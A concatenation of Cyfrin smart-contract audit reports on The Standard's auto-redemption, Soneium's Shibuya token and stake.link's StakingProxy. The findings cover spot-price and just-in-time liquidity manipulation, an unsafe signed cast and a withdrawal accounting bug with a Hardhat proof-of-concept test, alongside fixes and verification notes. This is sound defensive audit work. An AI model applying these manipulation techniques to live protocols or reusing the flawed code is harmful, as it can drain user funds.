**Cyfrin:** Acknowledged. Use of encrypted secrets is recommended.


### Automation and redemption could be artificially manipulated due to use of instantaneous `sqrtPriceX96`

**Description:** `AutoRedemption::checkUpkeep` is queried every block by the Chainlink Automation DON:

```solidity
function checkUpkeep(bytes calldata checkData) external returns (bool upkeepNeeded, bytes memory performData) {
    (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
    upkeepNeeded = sqrtPriceX96 <= triggerPrice;
}
```

However, use of `sqrtPriceX96` is problematic since it is based on the instantaneous pool reserves which can be manipulated to force upkeep into triggering even if it is not required. Additionally, this instantaneous price is used in calculation of the `USDs` that needs to be bought to reach the target price:

```solidity
function calculateUSDsToTargetPrice() private view returns (uint256 _usdc) {
    int24 _spacing = pool.tickSpacing();
    (uint160 _sqrtPriceX96, int24 _tick,,,,,) = pool.slot0();
    int24 _upperTick = _tick / _spacing * _spacing;
    int24 _lowerTick = _upperTick - _spacing;
    uint128 _liquidity = pool.liquidity();
    ...
}
```

So despite the latency between checking and fulfilling upkeep, and additional latency in fulfilling the Functions request, the `USDs` price can be manipulated without relying on multi-block manipulation. Combined with an attacker providing just-in-time (JIT) liquidity, the calculation can be manipulated to redeem the entire debt of a vault as capped within `AutoRedemption::fulfillRequest`:

```solidity
if (_USDsTargetAmount > _vaultData.status.minted) _USDsTargetAmount = _vaultData.status.minted;
```

**Impact:** A vault owner could manipulate the `USDs`/`USDC` pool reserves to force auto redemption even if it is not required. If their vault is the one returned by the off-chain service, they will have caused their debt to be repaid while circumventing fees. Note that other MEV attacks that have not been explored in this analysis may also be possible.

**Recommended Mitigation:** Re-check the upkeep condition within `AutoRedemption::performUpkeep` and `AutoRedemption::fulfilRequest` to minimize the impact of isolated price oracle manipulation; however, note that repeated manipulation does not necessarily require multi-block manipulation. Therefore, additionally consider consuming a time-weighted average price or work with Chainlink Labs to create a decentralized `USDs` price oracle.

**The Standard DAO:** Fixed by commit [5ec532e](https://github.com/the-standard/smart-vault/commit/5ec532e5f3813a865102501dbb91cf13a0813930).

**Cyfrin:** The trigger condition is re-checked and a TWAP has been implemented; however, it is recommended to use a substantially large interval (at least 900 seconds, if not 1800 seconds) to protect against manipulation. Note: Uniswap V3 pool oracles are not multi-block MEV resistant.

**The Standard DAO:** Fixed by commit [a8cdc77](https://github.com/the-standard/smart-vault/commit/a8cdc77d1fac9817128e1f3c1c8a1ab57f715513).

**Cyfrin:** Verified. The TWAP interval has been increased.


### `USDs` redemption calculation can be manipulated due to unsafe signed-unsigned cast

**Description:** The following logic is executed when calculating the `USDs` redemption amount, after the tick range has been advanced beyond that of the current tick:

```solidity
} else {
    (, int128 _liquidityNet,,,,,,) = pool.ticks(_lowerTick);
    _liquidity += uint128(_liquidityNet);
    (_amount0,) = LiquidityAmounts.getAmountsForLiquidity(
        _sqrtPriceX96,
        TickMath.getSqrtRatioAtTick(_lowerTick),
        TickMath.getSqrtRatioAtTick(_upperTick),
        _liquidity
    );
}
```

The `_liquidityNet` variable represents the net active liquidity delta when crossing between tick ranges, so this is considered along with the active liquidity of the original range; however, this value is cast from a signed integer to unsigned without actually checking the sign. Given that negative signed integers are represented using two's complement, net negative liquidities (i.e. less active liquidity in the subsequent range) will silently result in the incremented `_liquidity` being a very large number. This scenario could occur accidentally, or be forced by an attacker by the addition of just-in-time (JIT) liquidity, causing the target vault to be fully redeemed for the maximum `USDs`:

```solidity
if (_USDsTargetAmount > _vaultData.status.minted) _USDsTargetAmount = _vaultData.status.minted;
```

**Impact:** In the best case, more debt could be repaid than intended. In the worst case, fulfilment could be made to revert which will permanently disable auto redemption functionality (as described in a separate issue).

**Recommended Mitigation:** The sign of `_liquidityNet` should be checked before incrementing `_liquidity`, subtracting the absolute value if it is negative. Consider using the `LiquidityMath` [library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol).

**The Standard DAO:** Fixed by commit [49af007](https://github.com/the-standard/smart-vault/commit/49af007bcce5079ebfdc3de8f0c231ec4d0f121c).

**Cyfrin:** Verified. The `LiquidityMath` library is now used.


### Incorrect collateral quote amounts due to use of incorrect swap path

**Description:** Within `AutoRedemption::legacyAutoRedemption`, the amount of input collateral required is calculated as:

```solidity
(uint256 _approxAmountInRequired,,,) =
IQuoter(quoter).quoteExactOutput(_collateralToUSDCPath, _USDsTargetAmount);
uint256 _amountIn = _approxAmountInRequired > _collateralBalance ? _collateralBalance : _approxAmountInRequired;
```

This quote is incorrect as it uses the `collateral -> USDC` swap path for calculation of a target `USDs` amount. Since `USDs` is expected to be below peg for this logic to be triggered, it will take more collateral to swap to `_USDsTargetAmount` amount of `USDC` compared to that of `USDs`. Furthermore, `Quoter::quoteExactOutput` expects the path to be reversed when calculating the amount of the input token required to be swapped for an exact amount of the output token.

Similarly, in `SmartVaultV4::calculateAmountIn`, the swap path is `collateral -> USDC` but the amount output is compared to a `USDs` target amount (which is incorrectly named as `_USDCTargetAmount`):

```solidity
(uint256 _quoteAmountOut,,,) = IQuoter(_quoterAddress).quoteExactInput(_swapPath, _collateralBalance);
return _quoteAmountOut > _USDCTargetAmount
    ? _collateralBalance * _USDCTargetAmount / _quoteAmountOut
    : _collateralBalance;
```

**Impact:** The `_amountIn` variable will be inflated, causing more collateral to be swapped to `USDs` than needed to restore peg.

**Recommended Mitigation:** Use the reversed `collateral -> USDs` swap path to calculate the required amount in.

**The Standard DAO:** Fixed by commit [3c5e136](https://github.com/the-standard/smart-vault/commit/3c5e136cdab97d88e7aa79c23ee18e50d46d6276).

**Cyfrin:** Verified. With the introduction of the `SwapPath` struct containing both input and output paths along with the relevant swap path and target amount variables renamed to correctly reference `USDs` instead of `USDC`, this now appears to be correct so long as paths are configured as communicated (e.g. input: `WETH -> USDC -> USDs`, output: `USDs -> USDC -> WETH`.


### Auto redemption will not function due to slippage misconfiguration

**Description:** Both legacy and non-legacy vaults perform a call to `ISwapRouter::exactInput` when attempting to swap collateral to `USDs`, with the `amountOutMinimum` parameter being specified as the USD value of the collateral being swapped:

```solidity
calculator.tokenToUSD(
    ITokenManager(ISmartVaultManager(manager).tokenManager()).getTokenIfExists(_collateralAddr),
    _collateralAmount
)
```

However, this fails to account for slippage incurred during the swap.

The further `USDs` is below peg, the more `USDs` will be redeemed for a given amount of collateral and so this will not likely present any issues. When swapping through high fee, lower liquidity pools, auto redemption will be more likely to fail, especially if `USDs` is closer to peg.

Therefore, auto redemption will likely succeed most of the time, although it may be possible that the slippage requirement of a `USDs` amount out equivalent to the USD value of the input collateral will occasionally cause auto redemption to fail if enough value is lost through price impact of the intermediate swaps and the difference in the effective `USDs` amount is negligible.

This means the impact on auto redemption as an effective peg mechanism is minimal, so long as redemption is not attempted on a vault that would need to route through low liquidity swap paths, since it is far more likely to succeed as the `USDs` price decreases.

**Impact:** Dependent on the fee tiers/liquidities and `USDs` price deviation, it may not be possible for auto redemption to function.

**Recommended Mitigation:** Consider passing a less restrictive slippage parameter to both calls and perform some variation on the `significantCollateralDrop()` validation at the end of execution.

**The Standard DAO:** Fixed by commit [88b2d9f](https://github.com/the-standard/smart-vault/commit/88b2d9f8dcc4f33d1b472ad70d48a708352ee59f). Its quite an arbitrary buffer, but there is no possibility of user input here. Again, ideally the amount of `USDs` bought should be more than the amount of collateral swapped in.

**Cyfrin:** Verified. The buffer has been applied to mitigate potential issues with low-liquidity/high-fee pools.

\clearpage
## Low Risk


### Concentrated liquidity tick logic is incorrect

**Description:** `AutoRedemption::calculateUSDsToTargetPrice` performs the following concentrated liquidity tick calculations to determine the current tick range corresponding to a given price:

```solidity
int24 _spacing = pool.tickSpacing();
(uint160 _sqrtPriceX96, int24 _tick,,,,,) = pool.slot0();
int24 _upperTick = _tick / _spacing * _spacing;
int24 _lowerTick = _upperTick - _spacing;
```

However, due to the behavior of signed integers in Solidity rounding _up_ to zero rather than the next lowest integer, this logic is only correct for negative ticks and positive ticks that are an exact multiple of `_spacing`. Otherwise, if `tick` is a positive non-multiple of `_spacing`, the calculated `_upperTick` and `_lowerTick` will correspond to the range immediately below the true current range.

This error could cause the subsequent `while` loop to execute even if the current price is above the target price, or enter the incorrect conditional branch and consider net liquidity even when the current tick should be considered within range:

```solidity
while (TickMath.getSqrtRatioAtTick(_lowerTick) < TARGET_PRICE) {
    uint256 _amount0;
    if (_tick > _lowerTick && _tick < _upperTick) {
        (_amount0,) = LiquidityAmounts.getAmountsForLiquidity(
            _sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(_lowerTick),
            TickMath.getSqrtRatioAtTick(_upperTick),
            _liquidity
        );
    } else {
        (, int128 _liquidityNet,,,,,,) = pool.ticks(_lowerTick);
        _liquidity += uint128(_liquidityNet);
        (_amount0,) = LiquidityAmounts.getAmountsForLiquidity(
            _sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(_lowerTick),
            TickMath.getSqrtRatioAtTick(_upperTick),
            _liquidity
        );
    }
    _usdc += _amount0;
    _lowerTick += _spacing;
    _upperTick += _spacing;
}
```

Fortunately, this is highly unlikely to occur due to the difference in `USDs` and `USDC` decimals (`18` and `6` respectively). In calculation of `sqrtPriceX96`, which is a fixed point `Q64.96` number representing the square root of the ratio of the two pool assets (`token1`/`token0`), `USDs` is `token0` and `USDC` is `token1`. Given that the relative value of the two pool assets is expected to be reasonably stable, with the `TARGET_PRICE` defined as `79228162514264337593543` which corresponds to a ratio of `1e-12`, the square root price will realistically always be on the order $10^{-6}$:

$$\text{price ratio (token1/token0)} = \frac{10^{\text{USDC decimals}}}{10^{\text{USDs decimals}}} = \frac{10^{6}}{10^{18}} = 10^{-12}$$

$$\sqrt{\text{price ratio}} = \sqrt{10^{-12}} = 10^{-6}$$

This means the pool tick should realistically always be negative considering that a tick represents the logarithmic index of the price ratio, and the logarithm is negative since the ratio $10^{-12}$ is much smaller than 1:

$$\text{tick}=\log_{
\sqrt{(1.0001)}}(\text{priceratio})$$

It would take a de-peg event of unrealistic magnitude to cause this to be an issue, although `USDC` is upgradeable and so this caveat should not be relied upon.

**Impact:** The `USDs` calculation could be affected by errors in the calculation of tick ranges.

**Recommended Mitigation:** Modify the logic to consider the sign of `_tick` when calculating tick ranges.

**The Standard DAO:** Acknowledged. `AutoRedemption` will be deployed with trigger price of at negative tick, target price is at negative tick. Upkeep is only required between trigger price tick (or lower) and target price tick. Ticks are therefore not going to be positive.

**Cyfrin:** Acknowledged, based on the assumption that Circle does not update the decimals of `USDC`.


### Additional validation should be performed on the Chainlink Functions response

**Description:** When consuming a Chainlink Functions response, the following additional validation should be performed within `AutoRedemption::fulfillRequest`:
* Ensure the `_token` address is either a Hypervisor with valid data on the `SmartVaultYieldManager` contract (valid only for non-legacy vaults) or an accepted collateral token.
* Ensure the `_tokenID` has actually been minted such that `SmartVaultManagerV6::vaultData` will return a non-default `SmartVaultData` struct.

**The Standard DAO**
Fixed by commit [8ee0921](https://github.com/the-standard/smart-vault/commit/8ee0921026b5a56c0d441f3e87d5530506b7e445).

**Cyfrin:** Verified. `AutoRedemption::validData` has been added to verify that the vault address is non-zero and the token is a valid collateral token.

\clearpage
## Informational


### `AutoRedemption::calculateUSDsToTargetPrice` could be refactored to avoid repeated logic

**Description:** When calculating the target `USDs` amount, the call to `LiquidityAmounts::getAmountsForLiquidity` is common to both conditional branches, with the liquidity parameter being the only difference:

```solidity
uint128 _liquidity = pool.liquidity();
while (TickMath.getSqrtRatioAtTick(_lowerTick) < TARGET_PRICE) {
    uint256 _amount0;
    if (_tick > _lowerTick && _tick < _upperTick) {
        (_amount0,) = LiquidityAmounts.getAmountsForLiquidity(
            _sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(_lowerTick),
            TickMath.getSqrtRatioAtTick(_upperTick),
            _liquidity
        );
    } else {
        (, int128 _liquidityNet,,,,,,) = pool.ticks(_lowerTick);
        _liquidity += uint128(_liquidityNet);
        (_amount0,) = LiquidityAmounts.getAmountsForLiquidity(
            _sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(_lowerTick),
            TickMath.getSqrtRatioAtTick(_upperTick),
            _liquidity
        );
    }
    ...
}
```

This could be refactored to avoid repeated code such that it is only the liquidity calculations that remain in the conditionals.

**The Standard DAO:** Fixed by commit [e48ccff](https://github.com/the-standard/smart-vault/commit/e48ccff9f33be2871cfce47312451e03a359f6cc).

**Cyfrin:** Verified. The logic has been correctly refactored to only consider the net liquidity delta when the current tick is below the range.


### Incorrectly named return variable `AutoRedemption::calculateUSDsToTargetPrice`

**Description:** `AutoRedemption::calculateUSDsToTargetPrice` has the following signature:

```solidity
function calculateUSDsToTargetPrice() private view returns (uint256 _usdc)
```

However, the named return variable is semantically incorrect and should instead be `_usds` to avoid confusion.

**The Standard DAO:** Fixed by commit [a03f0d5](https://github.com/the-standard/smart-vault/commit/a03f0d54637195d34ed17f9a7540d6f201eef55d).

**Cyfrin:** Verified. The return variable has been renamed.


### Unused response parameter should be removed

**Description:** The `_estimatedCollateralValueUSD` parameter decoded from the Chainlink Functions response and passed as an argument to `AutoRedemption::legacyAutoRedemption` is not used and can be removed:

```solidity
(uint256 _tokenID, address _token, uint256 _estimatedCollateralValueUSD) =
    abi.decode(response, (uint256, address, uint256));
...
legacyAutoRedemption(
    _smartVault, _token, _collateralToUSDCPath, _USDsTargetAmount, _estimatedCollateralValueUSD
);
```

**The Standard DAO:** Fixed by commit [59c4bd5](https://github.com/the-standard/smart-vault/commit/59c4bd57f1d15c8d8eeb3965368f21e78594186c).

**Cyfrin:** Verified. The parameter has been removed and the source/decoding/signatures have been updated accordingly.


### Unused function argument in `SmartVaultYieldManager::quickDeposit` should be removed

**Description:** The `SmartVaultYieldManager::quickDeposit` function has the following signature:

```solidity
function quickDeposit(address _hypervisor, address _collateralToken, uint256 _deposit)
```

However, the `_hypervisor` argument is never used and so can be removed.

**The Standard DAO:** Fixed by commit [6f943c5](https://github.com/the-standard/smart-vault/commit/6f943c51756cd8023f45af0dee403212fdab096b).

**Cyfrin:** Verified. The unused address has been removed.


### Incorrect `SmartVaultV4` function arguments should be renamed

**Description:** The following functions in `SmartVaultV4` take an argument `_USDCTargetAmount`:
* `calculateAmountIn()`
* `swapCollateral()`
* `autoRedemption()`

However, this is semantically incorrect as it is intended to represent the target `USDs` redemption amount and so should be renamed to avoid confusion.

**The Standard DAO:** Fixed by commit [a03f0d5](https://github.com/the-standard/smart-vault/commit/a03f0d54637195d34ed17f9a7540d6f201eef55d).

**Cyfrin:** Verified. The function arguments have been renamed.


### The vault limit condition should not be checked for `address(0)`

**Description:** The virtual function `ERC721Upgradeable::_update` has been overridden within `SmartVaultManagerV6` as follows:

```solidity
function _update(address _to, uint256 _tokenID, address _auth) internal virtual override returns (address) {
    address _from = super._update(_to, _tokenID, _auth);
    require(vaultIDs(_to).length < userVaultLimit, "err-vault-limit");
    smartVaultIndex.transferTokenId(_from, _to, _tokenID);
    if (address(_from) != address(0)) ISmartVault(smartVaultIndex.getVaultAddress(_tokenID)).setOwner(_to);
    emit VaultTransferred(_tokenID, _from, _to);
    return _from;
}
```

However, the `userVaultLimit` validation should not be performed for `address(0)` otherwise it will become impossible to burn more than this number of tokens. Fortunately, such functionality is not currently exposed and it is not possible to transfer tokens directly to `address(0)` due to do validation within the OpenZeppelin contract. Nevertheless, this edge case should be proactively avoided.

Similarly, the call to `SmartVaultIndex::removeTokenId` within `SmartVaultIndex::transferTokenId` should be skipped if the `_from` is `address(0)` and pushing to the `tokenIds` array should be skipped if `_to` is `address(0)`:

```solidity
function transferTokenId(address _from, address _to, uint256 _tokenId) external onlyManager {
    removeTokenId(_from, _tokenId);
    tokenIds[_to].push(_tokenId);
}
```

**The Standard DAO:** Fixed by commit [ff4ef5b](https://github.com/the-standard/smart-vault/commit/ff4ef5b85561daf24f0443079a570f4bf4bd7389).

**Cyfrin:** Verified. The validation will now pass for the zero address.


### Unused return value can be removed

**Description:** The `IRedeemableLegacy::autoRedemption` function signature is as follows:

```solidity
function autoRedemption(
    address _swapRouterAddress,
    address _collateralAddr,
    bytes memory _swapPath,
    uint256 _amountIn
) external returns (uint256 _redeemed);
```

Within `SmartVaultV4Legact::autoRedemption`, the `_amountOut` return value is bubbled-up by `SmartVaultManagerV6::vaultAutoRedemption`:

```solidity
function vaultAutoRedemption(
    address _smartVault,
    address _collateralAddr,
    bytes memory _swapPath,
    uint256 _collateralAmount
) external onlyAutoRedemption returns (uint256 _amountOut) {
    return IRedeemableLegacy(_smartVault).autoRedemption(swapRouter, _collateralAddr, _swapPath, _collateralAmount);
}
```

However, it is never actually removed and so can be removed from both function signatures.

```solidity
function legacyAutoRedemption(
    address _smartVault,
    address _token,
    bytes memory _collateralToUSDCPath,
    uint256 _USDsTargetAmount,
    uint256 _estimatedCollateralValueUSD
) private {
    ...
    ISmartVaultManager(smartVaultManager).vaultAutoRedemption(_smartVault, _token, _collateralToUSDCPath, _amountIn);
}
```

**The Standard DAO:** Fixed by commit [2c58fa5](https://github.com/the-standard/smart-vault/commit/2c58fa5759b2d31162f31fdca7c0227a1ef08302).

**Cyfrin:** Verified. The return value is now used to emit an event.


### Redemption of Hypervisor collateral can be suboptimal

**Description:** Consider a vault with `20% WBTC`, `40% WETH`, and `40% WBTC Hypervisor` collateral in USD terms that is to be the target of auto redemption. Under the current logic, the `WBTC Hypervisor` address will be received from the API response as the collateral token to be redeemed. The `_token` variable is then reassigned to whichever underlying token is stored in the `hypervisorCollaterals` mapping (either `WBTC` or `WETH`, but not both):

```solidity
address _hypervisor;
if (hypervisorCollaterals[_token] != address(0)) {
    _hypervisor = _token;
    _token = hypervisorCollaterals[_hypervisor];
}
IRedeemable(_smartVault).autoRedemption(
    _smartVault, quoter, _token, _collateralToUSDCPath, _USDsTargetAmount, _hypervisor
);
```

If the mapping is configured such that `WBTC` is returned, it will not be possible to execute the most optimal redemption. This is a limitation the current design which could be improved by passing both a collateral token and an optionally non-zero Hypervisor token address in the API response.

**The Standard DAO:** Fixed by commit [fd1fe84](https://github.com/the-standard/smart-vault/commit/fd1fe846a16729d217514bb601a672f52722a611).

**Cyfrin:** The response has been modified to include both collateral token and Hypervisor token addresses; however, they should be validated to correctly correspond to one another before being used.

**The Standard DAO:** Fixed by commit [7346460](https://github.com/the-standard/smart-vault/commit/73464606afd58886ecf8fdf6372b6058566400a5).

**Cyfrin:** Verified. The additional validation has been added to `AutoRedemption::validData`.

\clearpage

------ FILE END car/reports_md/2024-12-18-cyfrin-the-standard-auto-redemption-v2.0.md ------


------ FILE START car/reports_md/2024-12-23-cyfrin-soneium-shibuya-v2.0.md ------

**Lead Auditors**

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Low Risk


### Lack of validation for default admin revocation during initialization

**Description:** In `ShibuyaToken::initializeV3()`, the contract attempts to revoke `DEFAULT_ADMIN_ROLE` from the provided `defaultAdmin` parameter. Based on the deployed contract on testnet and team communication, the intention was to remove the role from the original default admin address during the upgrade process.

However, the current implementation has two issues:
1. It revokes the role without first verifying if the address actually possesses the role in the previous version
2. The accompanying comments are misleading, stating "this is to make sure that the default admin is the owner and remove the default admin role from the deployer". This implies the deployer always has the default admin role, which isn't necessarily true.

```solidity
Shibuya.sol
36:         // this is to make sure that the default admin is the owner and remove the default admin role from the deployer
37:         // so this means that the deployer will not have any role in the contract
38:         // the the DEFAULT_ADMIN_ROLE will not have any role in the contract
39:         // and the owner will be performing the role of the admin
40:         _revokeRole(DEFAULT_ADMIN_ROLE, defaultAdmin);
```

Additionally, there's a typographical error in the comments at line 38 where "the" is repeated.

**Recommended Mitigation:**
- Add an explicit check if `defaultAdmin` has `DEFAULT_ADMIN_ROLE` before revoking
- Document clearly in the upgrade guide about role requirements
- Fix minor mistakes in comments

**Startale:** Fixed in commit [01789b](https://github.com/StartaleLabs/ccip-contracts-registration/commit/01789b01cb654607c91f011a3ea768ebfc486a14).

**Cyfrin:** Verified.

\clearpage
## Informational


### Incorrect documentation for mint function

**Description:** The `mint` function's documentation incorrectly states it "disallows burning from address(0)" when it should be "disallows minting to address(0)".

**Recommended Mitigation:** Update the documentation to correctly reflect the function's behavior

**Startale:** Fixed in PR [8](https://github.com/StartaleLabs/ccip-contracts-registration/pull/8).

**Cyfrin:** Verified.


### Redundant owner-based access control implementation

**Description:** The contract implements a custom ownership system alongside `AccessControlUpgradeable`, but fails to utilize the latter's built-in access control mechanisms effectively. Since the owner is not granted the `DEFAULT_ADMIN_ROLE`, the contract is forced to override several public functions from `AccessControlUpgradeable` to maintain proper access control.

This design choice implies potential issues:
1. Unnecessarily duplicates access control functionality that already exists in `AccessControlUpgradeable`
2. Requires overriding `grantRole()` and `revokeRole()` functions
3. Inconsistently handles role management by missing the override for `renounceRole()`
4. Increases code complexity and potential for access control confusion

While the current implementation is functional, it introduces unnecessary complexity and potential maintenance challenges.

**Recommended Mitigation:** Instead of implementing a separate ownership system we recommend the team to consider:
1. Grant the `DEFAULT_ADMIN_ROLE` to the owner during initialization
2. Remove custom ownership implementation
3. Utilize `AccessControlUpgradeable`'s built-in role management functions
4. Remove unnecessary function overrides

**Startale:** Acknowledged.

**Cyfrin:** Acknowledged.


### Missing zero amount validation in crosschain operations

**Description:** The `crosschainMint()` and `crosschainBurn()` functions don't validate for zero amounts, which could lead to unnecessary event emissions.

**Recommended Mitigation:** Add zero amount checks and revert if amount is zero.

**Startale:** Fixed in commit [fa77e9](https://github.com/StartaleLabs/ccip-contracts-registration/commit/fa77e9745ed943ba940a6523b441a67111355c1c).

**Cyfrin:** Verified.


### Incomplete ERC20 interface support

**Description:** The `supportsInterface()` function doesn't declare support for `IERC20` interface ID despite implementing ERC20 functionality.
This could cause issues with interface detection in some integration scenarios.

**Recommended Mitigation:** Add support for `type(IERC20).interfaceId` in the `supportsInterface` function.

**Startale:** Fixed in commit [cb5b05](https://github.com/StartaleLabs/ccip-contracts-registration/commit/cb5b05c4f09b449aa46b5e6290456f9f94cdb09f).

**Cyfrin:** Verified.



### Parameter naming inconsistency

**Description:** The parameter name 'minAndBurner' in the `grantMintAndBurnRoles()` function has a typo.

```solidity
function grantMintAndBurnRoles(address minAndBurner)
```

**Recommended Mitigation:** Correct the parameter name to 'mintAndBurner'.

**Startale:** Fixed in commit [669197](https://github.com/StartaleLabs/ccip-contracts-registration/commit/669197f945405f9805e90cc6fe49552c5f6e037a).

**Cyfrin:** Verified.


\clearpage

------ FILE END car/reports_md/2024-12-23-cyfrin-soneium-shibuya-v2.0.md ------


------ FILE START car/reports_md/2025-01-20-cyfrin-stakedotlink-stakingproxy-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Instant withdrawals in priority pool can result in loss of funds for StakingProxy contract

**Description:** When instant withdrawals are enabled in the priority pool, `staker` can permanently lose funds when withdrawing through the `StakingProxy` contract. The issue occurs because the withdrawn amount is not properly updated in the priority pool's `_withdraw` function during instant withdrawals, causing the tokens to be stuck in the Priority Pool while users lose their LSTs.

`PriorityPool::_withdraw`

```solidity
function _withdraw(
    address _account,
    uint256 _amount,
    bool _shouldQueueWithdrawal,
    bool _shouldRevertOnZero,
    bytes[] memory _data
) internal returns (uint256) {
    if (poolStatus == PoolStatus.CLOSED) revert WithdrawalsDisabled();

    uint256 toWithdraw = _amount;
    uint256 withdrawn;
    uint256 queued;

    if (totalQueued != 0) {
        uint256 toWithdrawFromQueue = toWithdraw <= totalQueued ? toWithdraw : totalQueued;

        totalQueued -= toWithdrawFromQueue;
        depositsSinceLastUpdate += toWithdrawFromQueue;
        sharesSinceLastUpdate += stakingPool.getSharesByStake(toWithdrawFromQueue);
        toWithdraw -= toWithdrawFromQueue;
        withdrawn = toWithdrawFromQueue; // -----> @audit withdrawn is set here
    }

    if (
        toWithdraw != 0 &&
        allowInstantWithdrawals &&
        withdrawalPool.getTotalQueuedWithdrawals() == 0
    ) {
        uint256 toWithdrawFromPool = MathUpgradeable.min(stakingPool.canWithdraw(), toWithdraw);
        if (toWithdrawFromPool != 0) {
            stakingPool.withdraw(address(this), address(this), toWithdrawFromPool, _data);
            toWithdraw -= toWithdrawFromPool; // -----> @audit BUG withdrawn is not updated here
        }
    }
    // ... rest of the function
}
```

When processing instant withdrawals, the function fails to update the withdrawn variable after successfully withdrawing tokens from the staking pool. This leads to the following sequence:

1. Staker initiates withdrawal through `StakingProxy::withdraw`
2. `StakingProxy` burns LSTs
3. `PriorityPool` receives underlying tokens from Staking Pool
4. But `PriorityPool` doesn't transfer tokens because `withdrawn` wasn't updated
5. Tokens remain stuck in `PriorityPool` while `StakingProxy` loses access to its liquid staking tokens

**Impact:** `StakingProxy` permanently loses access to its liquid staking tokens when attempting instant withdrawals

**Proof of Concept:** Copy the following test into `staking-proxy.test.ts`

```typescript
 it('instant withdrawals from staking pool are not transferred to staker', async () => {
    const { stakingProxy, stakingPool, priorityPool, signers, token, strategy, accounts } = await loadFixture(deployFixture)

    // Enable instant withdrawals
    await priorityPool.setAllowInstantWithdrawals(true)

    // Deposit initial amount
    await token.approve(stakingProxy.target, toEther(1000))
    await stakingProxy.deposit(toEther(1000), ['0x'])

    // Setup for withdrawals
    await strategy.setMaxDeposits(toEther(2000))
    await strategy.setMinDeposits(0)

    // Track all relevant balances before withdrawal
    const preTokenBalance = await token.balanceOf(stakingProxy.target)
    const preLSTBalance = await stakingPool.balanceOf(stakingProxy.target)

    const prePPBalance = await token.balanceOf(priorityPool.target)

    const withdrawAmount = toEther(500)

    console.log('=== Before Withdrawal ===')
    console.log('Initial LST Balance - Proxy contract:', fromEther(preLSTBalance))
    console.log('Initial Token Balance - Poxy contract:', fromEther(preTokenBalance))


    // Perform withdrawal
    await stakingProxy.withdraw(
        withdrawAmount,
        0,
        0,
        [],
        [],
        [],
        ['0x']
    )

    // Check all balances after withdrawal
    const postTokenBalance = await token.balanceOf(stakingProxy.target)
    const postPPBalance = await token.balanceOf(priorityPool.target)
    const postLSTBalance = await stakingPool.balanceOf(stakingProxy.target)

    console.log('=== After Withdrawal ===')
    console.log('Priority Pool - token balance change:', fromEther(postPPBalance - prePPBalance))
    console.log('Staking Proxy - token balance change:', fromEther(postTokenBalance - preTokenBalance))
    console.log('Staking Proxy - LST balance change:', fromEther(postLSTBalance - preLSTBalance))

    const lstsRedeemed = fromEther(preLSTBalance - postLSTBalance)

    // Assertions

    // 1. Staking Proxy has redeeemed all his LSTs
    assert.equal(
      lstsRedeemed,
        500,
        "Staker redeemed 500 LSTs"
    )

    // 2. But staking proxy doesn't receive underlying tokens
    assert.equal(
      fromEther(postTokenBalance - preTokenBalance),
        0,
        "Staking Proxy didn't receive any tokens despite losing LSTs"
    )

    // 3. The tokens are stuck in Priority Pool
    assert.equal(
        fromEther(postPPBalance- prePPBalance),
        500,
        "Priority Pool is holding the withdrawn tokens"
    )
  })
```

**Recommended Mitigation:** Consider updating the `withdrawn` variable when processing instant withdrawals in `PriorityPool::_withdraw`

**Stake.Link:** Fixed in commit [5f3d282](https://github.com/stakedotlink/contracts/commit/5f3d2829f86bc74d6b9e805d7e61d9392d6b21b1)

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Unrestricted reSDL token deposits with privileged withdrawals can lead to accidental loss of reSDL tokens

**Description:** The `StakingProxy` contract implements ERC721 receiver functionality allowing it to receive reSDL tokens (ERC721) from any address. However, only the contract owner has the ability to withdraw these tokens.

This creates a risk where user owned reSDL tokens can get stuck if sent to the proxy accidentally or without understanding the withdrawal restrictions.

`StakingProxy.sol`

```solidity

// ----> @audit Anyone can transfer reSDL tokens to the proxy
function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
    return this.onERC721Received.selector;
}

// ----> @audit Only owner can withdraw reSDL tokens
function withdrawRESDLToken(uint256 _tokenId, address _receiver) external onlyOwner {
    if (sdlPool.ownerOf(_tokenId) != address(this)) revert InvalidTokenId();
    IERC721(address(sdlPool)).safeTransferFrom(address(this), _receiver, _tokenId);
}
```
The reSDL tokens represent time-locked SDL staking positions that earn rewards. While the proxy's ability to hold reSDL tokens is an intended functionality for reward earning purposes, the unrestricted acceptance of transfers combined with privileged withdrawals creates unnecessary risk.

**Impact:** Any user accidentally transferring their reSDL tokens to the proxy has no direct way of recovering them without manual intervention of protocol team.


**Recommended Mitigation:** Consider gating the `onERC721Received` function to only accept transfers from authorized addresses that can be configured in the StakingProxy contract.

**Stake.link:**
Acknowledged.

**Cyfrin:** Acknowledged.


### Storage collision risk in UUPS upgradeable `StakingProxy` due to missing storage gap

**Description:** `StakingProxy` contract inherits from `UUPSUpgradeable` and `OwnableUpgradeable` but does not implement storage gaps to protect against storage collisions during upgrades.

`StakingProxy` is intended to be used by third parties/DAOs. It is possible that this contract gets inherited by external contracts with their own storage variables. In such a scenario, adding new storage variables to `StakingProxy` during an upgrade can shift storage slots and cause serious storage collision risks.


`StakingProxy.sol`
```solidity
contract StakingProxy is UUPSUpgradeable, OwnableUpgradeable {
    // address of asset token
    IERC20Upgradeable public token;
    // address of liquid staking token
    IStakingPool public lst;
    // address of priority pool
    IPriorityPool public priorityPool;
    // address of withdrawal pool
    IWithdrawalPool public withdrawalPool;
    // address of SDL pool
    ISDLPool public sdlPool;
    // address authorized to deposit/withdraw asset tokens
    address public staker; // ---> @audit missing storage slots
}
```

**Impact:** Potential storage collision can corrupt data and cause contract to malfunction.

**Recommended Mitigation:** Consider adding a storage gap at the end of the contract to reserve slots for future inherited contract variable. A slot size of 50 is the [OpenZeppelin's recommended pattern](https://docs.openzeppelin.com/contracts/3.x/upgradeable#:~:text=Storage%20Gaps,with%20existing%20deployments.) for upgradeable contracts.

**Stake.link:**
Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-01-20-cyfrin-stakedotlink-stakingproxy-v2.0.md ------


